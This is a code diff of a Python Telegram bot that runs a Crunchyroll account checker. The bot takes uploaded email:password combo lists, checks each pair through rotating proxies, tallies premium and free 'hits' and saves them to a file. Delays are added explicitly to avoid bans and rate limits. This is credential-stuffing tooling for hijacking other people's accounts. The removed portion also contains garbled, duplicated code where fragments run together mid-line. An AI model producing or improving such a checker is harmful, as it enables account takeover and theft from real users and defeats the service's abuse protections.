@@ -2,13 +2,13 @@ import os
 import asyncio
 import uuid
 import random
-import time
 import requests
 from aiogram import Bot, Dispatcher, types
 from aiogram.filters import Command
 from aiogram.types import FSInputFile
 from aiogram import F
 
+# ================== CONFIG ==================
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 AUTHORIZED_USERS = [int(x.strip()) for x in os.getenv("AUTHORIZED_USERS", "").split(",") if x.strip()]
 
@@ -97,7 +97,8 @@ Country : {result['country']}
 
 @dp.message(Command("start"))
 async def start(message: types.Message):
-    if message.from_user.id not in AUTHORIZED_USERS: return
+    if message.from_user.id not in AUTHORIZED_USERS:
+        return
     await message.answer("✅ Bot is ready.\nSend /check + combo or upload file.")
 
 
@@ -127,87 +128,13 @@ async def handle(message: types.Message):
         return await message.answer(f"✅ Loaded {len(proxies)} proxies.")
 
     # Check combos
-    await message.answer(f"🚀 Starting check on {len(lines)} combos... (slow mode)")
-
-    for line in lines:
-        try:
-            email, password = line.split(":", 1)
-            result = checker.check(email.strip(), password.strip())
-
-            stats['checked'] += 1
-            if result["status"] == "PREMIUM":
-                stats['premium'] += 1
-            elif result["status"] == "FREE":
-                stats['free'] += 1
-            else:
-                stats['invalid'] += 1
-
-            await send_result(message.from_user.id, result)
-
-            await asyncio.sleep(2.5)  # ← Increased delay to avoid rate limit
-
-        except Exception:
-            continue
-
-
-async def main():
-    global checker
-    checker = CrunchyrollChecker(proxies)
-    print("✅ Bot started")
-    await dp.start_polling(bot)
-
-
-if __name__ == "__main__":
-    asyncio.run(main())    if message.from_user.id not in AUTHORIZED_USERS: return
-    await message.answer("✅ Bot Online\nUse /check + combos or upload file")
-
-
-@dp.message(Command("stats"))
-async def stats_cmd(message: types.Message):
-    if message.from_user.id not in AUTHORIZED_USERS: return
-    await message.answer(f"📊 Checked: {stats['checked']}\n✅ Premium: {stats['premium']}")
-
-
-@dp.message(Command("hits"))
-async def hits_cmd(message: types.Message):
-    if message.from_user.id not in AUTHORIZED_USERS or not os.path.exists("hits.txt"):
-        return await message.answer("No hits yet.")
-    await message.answer_document(FSInputFile("hits.txt"))
-
-
-@dp.message(F.document | F.text)
-async def handle(message: types.Message):
-    if message.from_user.id not in AUTHORIZED_USERS:
-        return
-
-    global checker
-
-    if message.document:
-        file = await bot.get_file(message.document.file_id)
-        content = (await bot.download_file(file.file_path)).read().decode('utf-8', errors='ignore')
-    else:
-        content = message.text.replace("/check", "").strip()
-
-    lines = [line.strip() for line in content.splitlines() if ":" in line and len(line) > 10]
-
-    if not lines:
-        return await message.answer("No valid combos found.")
-
-    # Proxy loading
-    if "@" not in "".join(lines[:5]):
-        global proxies
-        proxies = [p for p in lines if p]
-        checker.proxies = proxies
-        return await message.answer(f"✅ Loaded {len(proxies)} proxies.")
-
-    # Checking
     await message.answer(f"🚀 Starting check on {len(lines)} combos... (with delay)")
 
     for line in lines:
         try:
             email, password = line.split(":", 1)
             result = checker.check(email.strip(), password.strip())
-            
+
             stats['checked'] += 1
             if result["status"] == "PREMIUM":
                 stats['premium'] += 1
@@ -217,8 +144,8 @@ async def handle(message: types.Message):
                 stats['invalid'] += 1
 
             await send_result(message.from_user.id, result)
-            
-            await asyncio.sleep(1.5)   # ← Important delay to avoid ban
+
+            await asyncio.sleep(2.5)   # Delay to avoid rate limit
 
         except:
             continue
@@ -227,7 +154,7 @@ async def handle(message: types.Message):
 async def main():
     global checker
     checker = CrunchyrollChecker(proxies)
-    print("Bot Started")
+    print("✅ Bot started successfully!")
     await dp.start_polling(bot)
 
 
